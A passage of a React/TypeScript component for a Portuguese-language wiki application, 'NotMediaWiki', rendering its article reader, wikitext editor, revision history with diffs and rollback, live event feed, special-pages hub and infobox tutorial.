                const anchorLink = target.closest('a[href^="#cite_"]') as HTMLAnchorElement | null;
                if (anchorLink) {
                  const hashId = anchorLink.getAttribute('href')?.slice(1);
                  if (hashId) {
                    const el = document.getElementById(hashId);
                    if (el) {
                      e.preventDefault();
                      el.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    }
                  }
                }
              }}
              dangerouslySetInnerHTML={{ __html: parseResult.html }}
            />

            {/* Live Personal Contributions Table on Namespace 2 User Pages */}
            {(currentArticle.namespace === 2 ||
              currentArticle.isPersonalUserPage ||
              currentArticle.slug.toLowerCase().startsWith('usuário:')) && (
              <div className="mt-8 border-2 border-[#141414] bg-white p-5 shadow-[4px_4px_0px_0px_rgba(20,20,20,1)] font-mono text-xs">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b-2 border-[#141414] pb-3 mb-4">
                  <div>
                    <h3 className="font-editorial text-xl font-bold text-stone-950 flex items-center gap-2">
                      <History className="w-5 h-5 text-amber-700" />
                      <span>Todas as Contribuições no NotMediaWiki</span>
                    </h3>
                    <p className="text-[11px] text-stone-600 mt-0.5">
                      Registro completo de criações, edições, revisões e eventos atribuídos a{' '}
                      <strong>{(currentArticle as any).ownerName || currentArticle.title.replace(/^Usuário:/i, '')}</strong>.
                    </p>
                  </div>
                  <span className="bg-amber-100 text-amber-950 border border-amber-500 px-2.5 py-1 text-[10px] font-bold uppercase">
                    {viewedUserContributions.length} contribuição(ões)
                  </span>
                </div>

                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mb-4">
                  <div className="bg-[#FAF9F5] border border-stone-300 p-2.5">
                    <span className="text-[10px] text-stone-500 uppercase block">Total</span>
                    <strong className="text-lg text-stone-950">{viewedUserContributions.length}</strong>
                  </div>
                  <div className="bg-[#FAF9F5] border border-stone-300 p-2.5">
                    <span className="text-[10px] text-stone-500 uppercase block">Páginas Criadas</span>
                    <strong className="text-lg text-emerald-700">
                      {viewedUserContributions.filter((c) => c.type === 'new').length}
                    </strong>
                  </div>
                  <div className="bg-[#FAF9F5] border border-stone-300 p-2.5">
                    <span className="text-[10px] text-stone-500 uppercase block">Edições</span>
                    <strong className="text-lg text-blue-700">
                      {viewedUserContributions.filter((c) => c.type !== 'new').length}
                    </strong>
                  </div>
                  <div className="bg-[#FAF9F5] border border-stone-300 p-2.5">
                    <span className="text-[10px] text-stone-500 uppercase block">Bytes Totais</span>
                    <strong className="text-lg text-stone-900">
                      {viewedUserContributions.reduce((sum, c) => sum + (c.byteSize || 0), 0).toLocaleString()}
                    </strong>
                  </div>
                </div>

                {viewedUserContributions.length === 0 ? (
                  <p className="text-stone-500 italic p-4 bg-stone-50 border border-dashed border-stone-300 text-center">
                    Nenhuma contribuição adicional registrada além da inicialização desta página pessoal.
                  </p>
                ) : (
                  <div className="overflow-x-auto">
                    <table className="w-full border-collapse border border-stone-300 text-[11px]">
                      <thead>
                        <tr className="bg-[#141414] text-white uppercase text-[10px]">
                          <th className="p-2 text-left">Data / Hora</th>
                          <th className="p-2 text-left">Página</th>
                          <th className="p-2 text-left">Tipo</th>
                          <th className="p-2 text-left">Sumário</th>
                          <th className="p-2 text-right">Tamanho</th>
                          <th className="p-2 text-right">Ação</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-stone-200">
                        {viewedUserContributions.map((contrib) => (
                          <tr key={contrib.id} className="hover:bg-amber-50/70">
                            <td className="p-2 text-stone-600 whitespace-nowrap">
                              {new Date(contrib.timestamp).toLocaleString('pt-BR')}
                            </td>
                            <td className="p-2 font-bold">
                              <button
                                type="button"
                                onClick={() => handleNavigateSlug(contrib.articleSlug)}
                                className="text-blue-800 hover:text-red-700 underline text-left cursor-pointer"
                              >
                                {contrib.articleTitle}
                              </button>
                            </td>
                            <td className="p-2">
                              <span
                                className={`px-1.5 py-0.5 text-[9px] font-bold uppercase ${
                                  contrib.type === 'new'
                                    ? 'bg-emerald-100 text-emerald-900 border border-emerald-400'
                                    : contrib.type === 'minor'
                                    ? 'bg-stone-200 text-stone-800'
                                    : 'bg-blue-100 text-blue-900 border border-blue-300'
                                }`}
                              >
                                {contrib.type === 'new' ? 'Criação' : contrib.type === 'minor' ? 'Menor' : 'Edição'}
                              </span>
                            </td>
                            <td className="p-2 font-serif text-stone-700">{contrib.comment}</td>
                            <td className="p-2 text-right text-stone-600 whitespace-nowrap">
                              {contrib.byteSize} B
                            </td>
                            <td className="p-2 text-right whitespace-nowrap">
                              <button
                                type="button"
                                onClick={() => {
                                  const targetArt = articles.find(
                                    (a) => a.slug.toLowerCase() === contrib.articleSlug.toLowerCase()
                                  );
                                  if (targetArt) {
                                    setCurrentSlug(targetArt.slug);
                                    setActiveTab('history');
                                  } else {
                                    showToast('Histórico completo disponível na aba Histórico & Diff.');
                                  }
                                }}
                                className="px-2 py-0.5 bg-stone-900 hover:bg-stone-700 text-amber-300 text-[10px] font-bold uppercase cursor-pointer"
                              >
                                Ver Diff
                              </button>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>
            )}

            {/* Categories Chips */}
            {parseResult.categories.length > 0 && (
              <div className="mt-8 pt-4 border-t-2 border-stone-300 font-mono text-xs flex flex-wrap items-center gap-2">
                <span className="font-bold text-stone-700 uppercase tracking-wider text-[10px] flex items-center gap-1">
                  <FolderTree className="w-3 h-3 text-stone-500" />
                  <span>Categorias:</span>
                </span>
                {parseResult.categories.map((cat, idx) => (
                  <span
                    key={idx}
                    className="bg-stone-100 hover:bg-stone-200 border border-stone-300 px-2.5 py-0.5 text-stone-800 font-bold uppercase text-[10px]"
                  >
                    {cat}
                  </span>
                ))}
              </div>
            )}
            {/* Gerador de Citação ABNT Customizável para Verbetes Wiki */}
            <AbntCitationGenerator
              articleId={currentArticle.slug || currentArticle.id}
              articleTitle={currentArticle.title}
              articleRawContent={parseResult.html || currentArticle.summary || currentArticle.wikitext || ''}
              defaultAuthor="NotMediaWiki"
              defaultPortalName="Enciclopédia NotMediaWiki — core.wazzimagiygg.com"
              defaultYear={(() => {
                const match = String(currentArticle.updatedAt || currentArticle.createdAt || '').match(/\b(19|20)\d{2}\b/);
                return match ? match[0] : String(new Date().getFullYear());
              })()}
              articleUrl={`${window.location.origin}/?uid=${encodeURIComponent(currentArticle.slug || currentArticle.id)}`}
              canonicalCoreUrl={`https://core.wazzimagiygg.com/?uid=${encodeURIComponent(currentArticle.slug || currentArticle.id)}`}
              showToast={showToast}
            />
          </div>
        </div>
      )}

      {/* ===================================================================== */}
      {/* TAB 3: WIKI EDITOR (EDITOR DE WIKITEXTO COM PRÉVIA SPLIT)             */}
      {/* ===================================================================== */}
      {activeTab === 'editor' && (
        <div className="bg-white border-2 border-[#141414] p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b-2 border-[#141414] pb-4">
            <div>
              <h3 className="font-editorial text-2xl font-bold text-stone-950 flex items-center gap-2">
                <Edit3 className="w-6 h-6 text-red-700" />
                <span>Editor de Wikitexto NotMediaWiki</span>
              </h3>
              <p className="text-xs font-mono text-stone-600 mt-1">
                Suporta sintaxe MediaWiki completa: cabeçalhos, infoboxes, links internos `[[...]]`, tabelas e citações `&lt;ref&gt;`.
              </p>
            </div>

            {/* Editor mode tabs */}
            <div className="flex items-center gap-1 font-mono text-xs">
              {(['split', 'code', 'preview'] as const).map((mode) => (
                <button
                  key={mode}
                  type="button"
                  onClick={() => setEditorTab(mode)}
                  className={`px-3 py-1 font-bold uppercase border cursor-pointer transition-all ${
                    editorTab === mode
                      ? 'bg-[#141414] text-white border-[#141414]'
                      : 'bg-stone-100 text-stone-700 border-stone-300 hover:bg-stone-200'
                  }`}
                >
                  {mode === 'split' ? 'Lado a Lado' : mode === 'code' ? 'Código' : 'Prévia'}
                </button>
              ))}
            </div>
          </div>

          {/* Quick-Insert Infobox Toolbar */}
          <div className="bg-[#FAF9F5] border border-stone-300 p-2.5 flex flex-wrap items-center justify-between gap-2 font-mono text-[10px]">
            <div className="flex flex-wrap items-center gap-1.5">
              <span className="font-bold uppercase text-stone-600 mr-1">Inserir Infobox:</span>
              <button
                type="button"
                onClick={() => {
                  const snippet = currentUser?.uid
                    ? buildUserInfoboxWikitext(currentUser, {
                        contributionsCount: Math.max(1, myContributionsCount),
                        pagesCreated: 1
                      })
                    : INFOBOX_TUTORIAL_TEMPLATES[0].wikitext;
                  setEditorWikitext((prev) => `${snippet}\n\n${prev}`);
                  showToast('{{Infobox Usuário}} inserido no topo do Wikitexto!');
                }}
                className="px-2 py-1 bg-amber-100 hover:bg-amber-200 text-amber-950 border border-amber-500 font-bold uppercase cursor-pointer"
              >
                + Infobox Usuário
              </button>
              <button
                type="button"
                onClick={() => {
                  setEditorWikitext((prev) => `${INFOBOX_TUTORIAL_TEMPLATES[1].wikitext}\n\n${prev}`);
                  showToast('{{Infobox Artigo}} inserido no topo do Wikitexto!');
                }}
                className="px-2 py-1 bg-blue-100 hover:bg-blue-200 text-blue-950 border border-blue-400 font-bold uppercase cursor-pointer"
              >
                + Infobox Artigo
              </button>
              <button
                type="button"
                onClick={() => {
                  setEditorWikitext((prev) => `${prev}\n{{Userbox|🌐|Membro ativo da comunidade NotMediaWiki}}`);
                  showToast('{{Userbox}} adicionado ao editor!');
                }}
                className="px-2 py-1 bg-stone-200 hover:bg-stone-300 text-stone-900 border border-stone-400 font-bold uppercase cursor-pointer"
              >
                + Userbox
              </button>
            </div>
            <button
              type="button"
              onClick={() => setActiveTab('tutorial')}
              className="text-blue-800 hover:text-red-700 font-bold underline uppercase cursor-pointer flex items-center gap-1"
            >
              <Sparkles className="w-3 h-3" />
              <span>Abrir Tutorial Completo de Infobox</span>
            </button>
          </div>

          <form noValidate onSubmit={handleSaveArticle} className="space-y-4 font-mono text-xs">
            <div>
              <label className="block text-stone-700 font-bold uppercase text-[10px] mb-1">
                Título do Verbete: <span className="text-red-700">*</span>
              </label>
              <input
                type="text"
                required
                maxLength={300}
                value={editorTitle}
                onChange={(e) => {
                  setEditorTitle(e.target.value);
                  setEditorFieldErrors((prev) => {
                    if (!prev.title && !prev.slug) return prev;
                    const next = { ...prev };
                    delete next.title;
                    delete next.slug;
                    return next;
                  });
                }}
                placeholder="Ex: Parsoid, Sistemas Distribuídos"
                className={`w-full p-2.5 border bg-[#F8F7F4] focus:outline-none text-sm font-editorial font-bold ${
                  editorFieldErrors.title || editorFieldErrors.slug
                    ? 'border-red-700 bg-red-50/40'
                    : 'border-[#141414]'
                }`}
              />
              {(editorFieldErrors.title || editorFieldErrors.slug) && (
                <p role="alert" className="mt-1 text-[11px] font-bold text-red-700">
                  {editorFieldErrors.title || editorFieldErrors.slug}
                </p>
              )}
            </div>

            {/* Code / Preview Area */}
            <div className={`grid gap-4 ${editorTab === 'split' ? 'grid-cols-1 lg:grid-cols-2' : 'grid-cols-1'}`}>
              {(editorTab === 'split' || editorTab === 'code') && (
                <div>
                  <label className="block text-stone-700 font-bold uppercase text-[10px] mb-1">
                    Código Wikitexto: <span className="text-red-700">*</span>
                  </label>
                  <textarea
                    rows={18}
                    required
                    value={editorWikitext}
                    onChange={(e) => {
                      setEditorWikitext(e.target.value);
                      setEditorFieldErrors((prev) => {
                        if (!prev.wikitext) return prev;
                        const next = { ...prev };
                        delete next.wikitext;
                        return next;
                      });
                    }}
                    placeholder="Escreva em wikitexto..."
                    className={`w-full p-3 border bg-[#F8F7F4] font-mono text-xs focus:outline-none leading-relaxed ${
                      editorFieldErrors.wikitext ? 'border-red-700 bg-red-50/40' : 'border-[#141414]'
                    }`}
                  />
                  {editorFieldErrors.wikitext && (
                    <p role="alert" className="mt-1 text-[11px] font-bold text-red-700">
                      {editorFieldErrors.wikitext}
                    </p>
                  )}
                </div>
              )}

              {(editorTab === 'split' || editorTab === 'preview') && (
                <div className="border border-stone-300 bg-[#FAF9F5] p-4 overflow-y-auto max-h-[500px]">
                  <span className="block text-[10px] font-bold uppercase tracking-wider text-stone-500 mb-3 border-b pb-1 font-mono">
                    Pré-visualização Parsoid ao Vivo:
                  </span>
                  <div
                    className="wiki-article-body flow-root prose prose-stone max-w-none font-serif text-xs text-stone-900 leading-relaxed"
                    dangerouslySetInnerHTML={{ __html: parseWikitextToHtml(editorWikitext, editorTitle).html }}
                  />
                </div>
              )}
            </div>

            {/* Summary & Minor Edit */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-2 border-t">
              <div className="sm:col-span-2">
                <label className="block text-stone-700 font-bold uppercase text-[10px] mb-1">
                  Sumário da Edição (Explicação curta):
                </label>
                <input
                  type="text"
                  value={editorSummary}
                  onChange={(e) => setEditorSummary(e.target.value)}
                  placeholder="Ex: Correção tipográfica, adição de referências"
                  className="w-full p-2 border border-[#141414] bg-[#F8F7F4] focus:outline-none"
                />
              </div>

              <div className="flex items-center pt-5">
                <label className="flex items-center gap-2 cursor-pointer font-bold text-stone-800 text-[11px]">
                  <input
                    type="checkbox"
                    checked={editorIsMinor}
                    onChange={(e) => setEditorIsMinor(e.target.checked)}
                  />
                  <span>Esta é uma edição menor</span>
                </label>
              </div>
            </div>

            {/* Submit Toolbar */}
            <div className="flex items-center justify-between pt-3 border-t">
              <button
                type="button"
                onClick={() => setActiveTab('reader')}
                className="paper-button-secondary px-4 py-2 font-bold uppercase cursor-pointer"
              >
                Cancelar
              </button>

              <button
                type="submit"
                disabled={isSavingArticle}
                className="paper-button bg-red-700 hover:bg-red-800 text-white px-6 py-2 font-bold uppercase tracking-wider cursor-pointer shadow-[3px_3px_0px_0px_rgba(20,20,20,1)] disabled:opacity-50 flex items-center gap-2"
              >
                <CheckCircle className="w-4 h-4 text-amber-300" />
                <span>{isSavingArticle ? 'Gravando Revisão...' : 'Gravar Alterações'}</span>
              </button>
            </div>
          </form>
        </div>
      )}

      {/* ===================================================================== */}
      {/* TAB 4: ARTICLE HISTORY & DIFF                                         */}
      {/* ===================================================================== */}
      {activeTab === 'history' && !currentArticle && (
        <div className="bg-white border-2 border-[#141414] p-10 text-center font-mono text-xs shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] space-y-4">
          <GitCompare className="w-12 h-12 mx-auto text-stone-400" />
          <h3 className="font-editorial text-2xl font-bold text-stone-900">
            Nenhum Artigo Selecionado para Histórico
          </h3>
          <p className="text-stone-600 max-w-md mx-auto">
            Selecione ou crie um verbete real no banco de dados para consultar suas revisões criptográficas.
          </p>
          <button
            onClick={() => setActiveTab('portal')}
            className="paper-button bg-stone-900 text-white hover:bg-stone-800 px-4 py-2 font-bold uppercase tracking-wider cursor-pointer"
          >
            Voltar ao Acervo
          </button>
        </div>
      )}

      {activeTab === 'history' && currentArticle && (
        <div className="bg-white border-2 border-[#141414] p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] space-y-6">
          <div className="border-b-2 border-[#141414] pb-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div>
              <h3 className="font-editorial text-2xl font-bold text-stone-950 flex items-center gap-2">
                <GitCompare className="w-6 h-6 text-blue-700" />
                <span>Histórico de Revisões: {currentArticle.title}</span>
              </h3>
              <p className="text-xs font-mono text-stone-600 mt-1">
                Ledger imutável com hashes SHA-256 e cálculo de diff visual via algoritmo Myers.
              </p>
            </div>

            <button
              onClick={() => setActiveTab('reader')}
              className="paper-button-secondary px-3 py-1.5 text-xs font-mono font-bold uppercase cursor-pointer"
            >
              Voltar ao Verbete
            </button>
          </div>

          {/* Diff Controls Selector */}
          {articleRevisions.length >= 2 && (
            <div className="p-4 bg-[#FAF9F5] border-2 border-stone-300 font-mono text-xs space-y-3">
              <span className="font-bold text-stone-900 uppercase text-[11px] block">
                Comparar Duas Revisões:
              </span>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="block text-[10px] text-stone-600 uppercase font-bold mb-1">
                    Versão Antiga (Base):
                  </label>
                  <select
                    value={selectedOldRevId}
                    onChange={(e) => setSelectedOldRevId(e.target.value)}
                    className="w-full p-2 border border-stone-400 bg-white"
                  >
                    {articleRevisions.map((r) => (
                      <option key={r.id} value={r.id}>
                        {r.id} — {new Date(r.timestamp).toLocaleString('pt-BR')} ({r.author.name})
                      </option>
                    ))}
                  </select>
                </div>

                <div>
                  <label className="block text-[10px] text-stone-600 uppercase font-bold mb-1">
                    Versão Mais Recente (Comparada):
                  </label>
                  <select
                    value={selectedNewRevId}
                    onChange={(e) => setSelectedNewRevId(e.target.value)}
                    className="w-full p-2 border border-stone-400 bg-white"
                  >
                    {articleRevisions.map((r) => (
                      <option key={r.id} value={r.id}>
                        {r.id} — {new Date(r.timestamp).toLocaleString('pt-BR')} ({r.author.name})
                      </option>
                    ))}
                  </select>
                </div>
              </div>

              {diffResult && (
                <div className="flex items-center gap-4 text-[11px] pt-2 border-t border-stone-300">
                  <span className="text-emerald-700 font-bold">+{diffResult.stats.added} linhas adicionadas</span>
                  <span className="text-red-700 font-bold">-{diffResult.stats.removed} linhas removidas</span>
                  <span className="text-stone-600 font-bold">{diffResult.stats.byteDelta > 0 ? `+${diffResult.stats.byteDelta}` : diffResult.stats.byteDelta} bytes</span>
                </div>
              )}
            </div>
          )}

          {/* Visual Diff View */}
          {diffResult && (
            <div className="border border-stone-300 font-mono text-xs overflow-x-auto bg-white">
              <div className="bg-[#141414] text-white p-2.5 font-bold uppercase text-[10px] tracking-wider">
                Diff Linha a Linha (Algoritmo Myers)
              </div>
              <div className="divide-y divide-stone-200">
                {diffResult.lines.map((line, idx) => (
                  <div
                    key={idx}
                    className={`flex items-start p-1.5 font-mono text-xs ${
                      line.type === 'added'
                        ? 'bg-emerald-50 text-emerald-950 font-bold border-l-4 border-emerald-600'
                        : line.type === 'removed'
                        ? 'bg-red-50 text-red-950 line-through border-l-4 border-red-600'
                        : 'text-stone-800'
                    }`}
                  >
                    <span className="w-8 shrink-0 text-stone-400 text-[10px] select-none text-right pr-2">
                      {line.type === 'added' ? '+' : line.type === 'removed' ? '-' : ' '}
                    </span>
                    <span className="w-12 shrink-0 text-stone-400 text-[10px] select-none">
                      {line.lineNumberNew || line.lineNumberOld}
                    </span>
                    <span className="flex-1 whitespace-pre-wrap break-all">{line.content || ' '}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Revisions Table */}
          <div className="overflow-x-auto">
            <span className="font-bold text-stone-900 font-mono text-xs uppercase tracking-wider block mb-2">
              Todas as Revisões Deste Verbete:
            </span>
            <table className="w-full font-mono text-xs border-collapse border border-stone-300">
              <thead>
                <tr className="bg-[#141414] text-white uppercase text-[10px]">
                  <th className="p-2.5 text-left">ID Revisão</th>
                  <th className="p-2.5 text-left">Data & Hora</th>
                  <th className="p-2.5 text-left">Autor</th>
                  <th className="p-2.5 text-left">Sumário</th>
                  <th className="p-2.5 text-right">Tamanho</th>
                  <th className="p-2.5 text-right">Ação</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-stone-200">
                {articleRevisions.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="p-6 text-center text-stone-500 font-mono text-xs">
                      Nenhuma revisão registrada no banco de dados para este verbete.
                    </td>
                  </tr>
                ) : (
                  articleRevisions.map((rev) => (
                    <tr key={rev.id} className="hover:bg-amber-50">
                      <td className="p-2.5 font-bold text-blue-700">{rev.id}</td>
                      <td className="p-2.5 text-stone-600">{new Date(rev.timestamp).toLocaleString('pt-BR')}</td>
                      <td className="p-2.5 font-bold text-stone-900">{rev.author.name}</td>
                      <td className="p-2.5 text-stone-700 font-serif">{rev.comment}</td>
                      <td className="p-2.5 text-right text-stone-500">{rev.byteSize} bytes</td>
                      <td className="p-2.5 text-right">
                        {rev.id !== currentArticle.latestRevisionId && (
                          <button
                            onClick={() => handleRollback(rev)}
                            className="bg-amber-600 hover:bg-amber-700 text-white px-2.5 py-1 text-[10px] font-bold uppercase cursor-pointer shadow-[1px_1px_0px_0px_rgba(0,0,0,1)]"
                          >
                            Reverter
                          </button>
                        )}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* ===================================================================== */}
      {/* TAB 5: EVENTSTREAMS EM TEMPO REAL                                     */}
      {/* ===================================================================== */}
      {activeTab === 'events' && (
        <div className="bg-white border-2 border-[#141414] p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] space-y-4">
          <div className="border-b-2 border-[#141414] pb-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div>
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 bg-emerald-500 rounded-full animate-ping" />
                <h3 className="font-editorial text-2xl font-bold text-stone-950">
                  EventStreams em Tempo Real
                </h3>
              </div>
              <p className="text-xs font-mono text-stone-600 mt-1">
                Feed de eventos e mutações do acervo NotMediaWiki transmitido via Server-Sent Events (SSE).
              </p>
            </div>
          </div>

          <div className="space-y-3 font-mono text-xs">
            {events.length === 0 ? (
              <div className="p-8 border border-dashed border-stone-300 bg-stone-50 text-center font-mono text-xs text-stone-500">
                Nenhuma alteração recente registrada no banco de dados. Todas as edições e criações aparecerão aqui em tempo real.
              </div>
            ) : (
              events.map((evt) => (
                <div
                  key={evt.id}
                  className="p-3 border border-stone-300 bg-stone-50 hover:bg-white transition-all shadow-[2px_2px_0px_0px_rgba(20,20,20,1)]"
                >
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-1">
                    <div className="flex items-center gap-2">
                      <span className="bg-[#141414] text-white px-1.5 py-0.2 text-[9px] font-bold uppercase">
                        {evt.type}
                      </span>
                      <span
                        onClick={() => handleNavigateSlug(evt.page_title)}
                        className="font-bold text-blue-800 hover:underline cursor-pointer"
                      >
                        {evt.page_title}
                      </span>
                    </div>
                    <span className="text-[10px] text-stone-500">
                      {new Date(evt.meta?.dt || evt.timestamp || Date.now()).toLocaleTimeString('pt-BR')} • {evt.meta?.stream || 'mediawiki.recentchange'}
                    </span>
                  </div>

                  <p className="text-xs text-stone-700 font-serif">{evt.comment}</p>

                  <div className="mt-2 text-[10px] text-stone-500 flex items-center justify-between pt-1 border-t border-stone-200">
                    <span>Editor: <strong>{evt.user_text}</strong></span>
                    <span>{evt.rev_len} bytes • rev: {evt.rev_id}</span>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      )}

      {/* ===================================================================== */}
      {/* TAB 6: PÁGINAS ESPECIAIS (SPECIAL PAGES HUB)                          */}
      {/* ===================================================================== */}
      {activeTab === 'special' && (
        <div className="bg-white border-2 border-[#141414] p-6 shadow-[6px_6px_0px_0px_rgba(20,20,20,1)] space-y-6 font-mono text-xs">
          <div className="border-b-2 border-[#141414] pb-4">
            <h3 className="font-editorial text-2xl font-bold text-stone-950 flex items-center gap-2">
              <List className="w-6 h-6 text-stone-700" />
              <span>Diretório de Páginas Especiais (Special:SpecialPages)</span>
            </h3>
            <p className="text-xs text-stone-600 mt-1">
              Ferramentas de indexação, relatórios e navegação estruturada no acervo.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="p-4 bg-[#FAF9F5] border-2 border-[#141414]">
              <span className="font-bold uppercase text-[11px] block mb-2 text-stone-900">
                Páginas do Acervo:
              </span>
              <ul className="space-y-1.5 text-stone-700">
                {articles.length === 0 ? (
                  <li className="text-stone-500 italic text-[11px]">Nenhum artigo cadastrado no banco de dados.</li>
                ) : (
                  articles.map((art) => (
                    <li key={art.id}>
                      <button
                        onClick={() => handleNavigateSlug(art.slug)}
                        className="hover:text-blue-700 hover:underline cursor-pointer flex items-center gap-1.5"
                      >
                        <ChevronRight className="w-3 h-3 text-stone-400" />
                        <span>{art.title}</span>
                      </button>
                    </li>
                  ))
                )}
              </ul>
            </div>

            <div className="p-4 bg-[#FAF9F5] border-2 border-[#141414]">
              <span className="font-bold uppercase text-[11px] block mb-2 text-stone-900">
                Estatísticas Globais:
              </span>
              <div className="space-y-2 text-stone-800">
                <div className="flex justify-between border-b pb-1">
                  <span>Total de Páginas:</span>
                  <span className="font-bold">{articles.length}</span>
                </div>
                <div className="flex justify-between border-b pb-1">
                  <span>Revisões Efetuadas:</span>
                  <span className="font-bold">{revisions.length}</span>
                </div>
                <div className="flex justify-between border-b pb-1">
                  <span>Visualizações Totais:</span>
                  <span className="font-bold">{articles.reduce((a, b) => a + b.views, 0)}</span>
                </div>
                <div className="flex justify-between border-b pb-1">
                  <span>Versão Wiki-Site:</span>
                  <span className="font-bold text-amber-800">{WIKI_SITE_VERSION}</span>
                </div>
                <div className="flex justify-between border-b pb-1">
                  <span>Série / Revisão:</span>
                  <span className="font-bold">{WIKI_SITE_SERIES} • {WIKI_SITE_REVISION}</span>
                </div>
                <div className="flex justify-between border-b pb-1">
                  <span>Extensões Ativas:</span>
                  <span className="font-bold text-emerald-700">{extensions.length} ativas</span>
                </div>
                <div className="flex justify-between">
                  <span>Licença &amp; Motor:</span>
                  <span className="font-bold text-right">{WIKI_SITE_LICENSE}</span>
                </div>
              </div>
              <p className="text-[10px] text-stone-500 mt-2 pt-2 border-t border-stone-200">
                Special:Version • {WIKI_SITE_ENGINE}
              </p>
            </div>

            <div className="p-4 bg-[#FAF9F5] border-2 border-[#141414]">
              <span className="font-bold uppercase text-[11px] block mb-2 text-stone-900">
                Ações Rápidas:
              </span>
              <div className="space-y-2">
                {myPersonalUserPage && (
                  <button
                    type="button"
                    onClick={() => handleNavigateSlug(myPersonalUserPage.slug)}
                    className="w-full bg-emerald-700 hover:bg-emerald-800 text-white p-2 font-bold uppercase text-[10px] cursor-pointer"
                  >
                    Minha Página ({myPersonalUserPage.title})
                  </button>
                )}
                <button
                  type="button"
                  onClick={() => setActiveTab('tutorial')}
                  className="w-full bg-amber-500 hover:bg-amber-400 text-stone-950 p-2 font-bold uppercase text-[10px] cursor-pointer border border-[#141414]"
                >
                  Tutorial Oficial de Infobox
                </button>
                <button
                  onClick={handleOpenNewArticle}
                  className="w-full bg-[#141414] hover:bg-stone-800 text-white p-2 font-bold uppercase text-[10px] cursor-pointer"
                >
                  Criar Nova Página
                </button>
                <button
                  type="button"
                  onClick={handleOpenRandomArticle}
                  className="w-full paper-button-secondary p-2 font-bold uppercase text-[10px] cursor-pointer flex items-center justify-center gap-1.5"
                  title="Especial:Aleatório — Sortear artigo no acervo"
                >
                  <Shuffle className="w-3.5 h-3.5 text-amber-800" />
                  <span>Artigo Aleatório (Special:Random)</span>
                </button>
                <button
                  type="button"
                  onClick={() => setActiveTab('governance')}
                  className="w-full bg-red-700 hover:bg-red-800 text-white p-2 font-bold uppercase text-[10px] cursor-pointer flex items-center justify-center gap-1.5"
                >
                  <ShieldAlert className="w-3.5 h-3.5 text-amber-300" />
                  <span>Painel LGPD Art. 18 (Exclusão)</span>
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ===================================================================== */}
      {/* TAB 3.5: TUTORIAL OFICIAL DE INFOBOX NOTMEDIAWIKI                     */}
      {/* ===================================================================== */}
      {activeTab === 'tutorial' && (
        <NotMediaWikiInfoboxTutorial
          currentUser={currentUser}
          personalPageSlug={myPersonalUserPage?.slug}
          contributionsCount={myContributionsCount}
          showToast={showToast}
          onInsertIntoEditor={(wikitext, suggestedTitle) => {
            if (suggestedTitle) {
              setEditorTitle(suggestedTitle);
            } else if (!editorTitle.trim()) {
              setEditorTitle('Novo_Verbete_com_Infobox');
            }
            setEditorWikitext(wikitext);
            setEditorSummary('Inserção de modelo via Tutorial Oficial de Infobox');
            setEditorFieldErrors({});
            setActiveTab('editor');
            showToast('Modelo de Infobox carregado no Editor Wikitexto!');
          }}
          onApplyToPersonalPage={
            myPersonalUserPage
              ? async (infoboxWikitext) => {
                  const replacedBody = /\{\{Infobox[\s\S]*?\}\}/i.test(myPersonalUserPage.wikitext)
                    ? myPersonalUserPage.wikitext.replace(/\{\{Infobox[\s\S]*?\}\}/i, infoboxWikitext)
                    : `${infoboxWikitext}\n\n${myPersonalUserPage.wikitext}`;

                  const revId = `rev-usr-${Date.now().toString(36)}`;
                  const authorName = resolveUserDisplayName(currentUser);
                  const updatedPage: WikiArticle = {
                    ...myPersonalUserPage,
                    wikitext: replacedBody,
                    latestRevisionId: revId,
                    updatedAt: new Date().toISOString()
                  };
                  const newRev: WikiRevision = {
                    id: revId,
                    articleSlug: myPersonalUserPage.slug,
                    parentRevisionId: myPersonalUserPage.latestRevisionId,
                    wikitext: replacedBody,
                    comment: 'Atualização do {{Infobox Usuário}} via Tutorial Interativo',
                    author: { id: currentUser?.uid || 'usr_community', name: authorName, isBot: false },
                    timestamp: new Date().toISOString(),
                    sha256: computeSha256Hex(replacedBody),
                    byteSize: replacedBody.length,
                    isMinor: false
                  };

                  await saveNotMediaWikiUserPageToDb(updatedPage, newRev);
                  setArticles((prev) => [
                    updatedPage,
                    ...prev.filter((a) => a.slug.toLowerCase() !== updatedPage.slug.toLowerCase())
                  ]);
                  setRevisions((prev) => [newRev, ...prev]);
                  setCurrentSlug(updatedPage.slug);
                  setActiveTab('reader');
                  showToast('✓ Infobox aplicado na sua página pessoal do NotMediaWiki!');
                }
              : undefined
          }
        />
      )}

      {/* ===================================================================== */}
      {/* TAB 7: EXTENSÕES & DISPOSITIVOS DE SEGURANÇA (3.05.9.a & 3.05.9.b)    */}
      {/* ===================================================================== */}
      {activeTab === 'extensions' && (
        <div className="space-y-4">
          <div className="bg-white border-2 border-[#141414] p-3 shadow-[4px_4px_0px_0px_rgba(20,20,20,1)] flex flex-wrap items-center justify-between gap-2 font-mono text-xs">
            <div className="flex items-center gap-2">
              <Puzzle className="w-4 h-4 text-purple-700" />
              <span className="font-bold uppercase tracking-wider text-stone-900">
                Sistema Modular de Extensões
              </span>
            </div>
            <div className="flex items-center gap-2">
              <button
                type="button"
